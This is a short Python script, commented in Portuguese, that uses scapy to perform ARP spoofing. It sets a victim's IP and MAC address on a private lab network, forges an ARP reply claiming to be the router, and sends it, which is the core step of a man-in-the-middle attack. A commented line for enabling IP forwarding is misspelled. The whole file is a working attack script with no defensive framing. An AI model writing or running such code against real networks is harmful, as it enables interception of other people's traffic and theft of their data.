import scapy.all as scapy
#echo 1 > /proc/sys/net/ipv4/ip_foward
# exibindo os pacotes de ARP
#print(scapy.ls(scapy.ARP))
# definindo vítima
target_ip = "192.168.47.134"
target_mac = "00:0c:29:8d:18:17"
router_ip = "192.168.47.2"
# fingindo ser o roteador
packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
# Mostra as alterações feitas nos pacotes
# print(packet.show())
# print(packet.summary())
# Envia o pacote
scapy.send(packet)
